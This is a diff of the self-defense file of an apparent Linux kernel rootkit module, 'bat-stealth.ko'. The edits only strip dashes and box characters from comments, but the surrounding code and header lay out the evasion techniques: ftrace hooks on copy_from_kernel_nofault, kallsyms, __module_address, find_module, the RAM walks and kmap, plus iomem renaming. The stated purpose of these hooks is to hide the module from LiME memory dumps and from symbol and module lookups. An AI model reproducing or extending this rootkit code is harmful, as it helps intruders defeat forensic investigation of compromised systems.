@@ -1,15 +1,15 @@
-/* selfdefense.c — Memory forensics evasion for bat-stealth.ko.
+/* selfdefense.c   Memory forensics evasion for bat-stealth.ko.
  *
  * Protections:
- *   1. copy_from_kernel_nofault hook — returns zeros for module pages (LiME bypass)
- *   2. kallsyms_on_each_symbol hook  — filters our symbols from kallsyms enumeration
- *   3. __module_address hook         — returns NULL for addresses within this module
- *   4. find_module hook              — returns NULL for "bat_stealth" name lookup
- *   5. LiME RAM walk hooks           — excludes module physical pages from dumps
- *   6. kmap hooks                    — returns zero page when our pages are mapped
- *   7. iomem poisoning               — renames our RAM region to "Reserved"
+ *   1. copy_from_kernel_nofault hook   returns zeros for module pages (LiME bypass)
+ *   2. kallsyms_on_each_symbol hook    filters our symbols from kallsyms enumeration
+ *   3. __module_address hook           returns NULL for addresses within this module
+ *   4. find_module hook                returns NULL for "bat_stealth" name lookup
+ *   5. LiME RAM walk hooks             excludes module physical pages from dumps
+ *   6. kmap hooks                      returns zero page when our pages are mapped
+ *   7. iomem poisoning                 renames our RAM region to "Reserved"
  *
- * Ported from Singularity selfdefense.c — no arch-specific changes needed
+ * Ported from Singularity selfdefense.c   no arch-specific changes needed
  * (all hooks are on internal kernel functions, not syscalls).
  */
 #include "../include/core.h"
@@ -70,7 +70,7 @@ static notrace const u8 *sd_find_snap(unsigned long addr, size_t size)
     return NULL;
 }
 
-/* ── kprobe protection ───────────────────────────────────────────── */
+/*  kprobe protection                                             */
 
 static int (*orig_register_kprobe)(struct kprobe *p);
 
@@ -141,7 +141,7 @@ static void sd_bootstrap_kprobe_unhook(void)
     ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
 }
 
-/* ── copy_from_kernel_nofault hook — LiME read evasion ──────────── */
+/*  copy_from_kernel_nofault hook   LiME read evasion            */
 
 static long (*orig_copy_from_kernel_nofault)(void *dst, const void *src,
                                               size_t size);
@@ -168,7 +168,7 @@ static notrace long hook_copy_from_kernel_nofault(void *dst, const void *src,
     return orig_copy_from_kernel_nofault(dst, src, size);
 }
 
-/* ── kallsyms_on_each_symbol hook — symbol enumeration filter ────── */
+/*  kallsyms_on_each_symbol hook   symbol enumeration filter      */
 
 typedef int (*ksym_cb_t)(void *data, const char *name, unsigned long addr);
 static int (*orig_kallsyms_on_each_symbol)(ksym_cb_t fn, void *data);
@@ -189,7 +189,7 @@ static notrace int hook_kallsyms_on_each_symbol(ksym_cb_t fn, void *data)
     return orig_kallsyms_on_each_symbol(sd_ksym_cb, &f);
 }
 
-/* ── __module_address + find_module hooks ────────────────────────── */
+/*  __module_address + find_module hooks                          */
 
 static struct module *(*orig_module_address)(unsigned long addr);
 
@@ -213,7 +213,7 @@ static notrace struct module *hook_find_module(const char *name)
     return orig_find_module(name);
 }
 
-/* ── Physical memory range ───────────────────────────────────────── */
+/*  Physical memory range                                         */
 
 static notrace void sd_module_phys_range(unsigned long *phys_start,
                                           unsigned long *phys_end)
@@ -242,7 +242,7 @@ static notrace void sd_module_phys_range(unsigned long *phys_start,
     *phys_end = pg ? (page_to_phys(pg) + PAGE_SIZE - 1) : 0;
 }
 
-/* ── RAM walk hooks — LiME dump exclusion ───────────────────────── */
+/*  RAM walk hooks   LiME dump exclusion                         */
 
 typedef int (*walk_ram_cb_t)(u64, u64, void *);
 static int (*orig_walk_system_ram_res)(u64 start, u64 end, void *arg,
@@ -310,7 +310,7 @@ static notrace int hook_walk_iomem_res_desc(unsigned long desc,
                                     &ctx, sd_iomem_filter);
 }
 
-/* ── iomem poisoning ─────────────────────────────────────────────── */
+/*  iomem poisoning                                               */
 
 extern struct resource iomem_resource;
 
@@ -352,7 +352,7 @@ static notrace void sd_restore_iomem(void)
     }
 }
 
-/* ── kmap hooks — zero page substitution ─────────────────────────── */
+/*  kmap hooks   zero page substitution                           */
 
 static struct page *sd_zero_page = NULL;
 
@@ -387,7 +387,7 @@ static notrace void *hook_kmap_local_page(struct page *page)
     return orig_kmap_local_page(page);
 }
 
-/* ── Hook tables ─────────────────────────────────────────────────── */
+/*  Hook tables                                                   */
 
 static struct ftrace_hook sd_hooks_core[] = {
     HOOK("copy_from_kernel_nofault", hook_copy_from_kernel_nofault,
@@ -409,7 +409,7 @@ static struct ftrace_hook sd_hooks_lime[] = {
 
 static unsigned int sd_lime_installed = 0;
 
-/* ── Init / Exit ─────────────────────────────────────────────────── */
+/*  Init / Exit                                                   */
 
 notrace int selfdefense_init(void)
 {
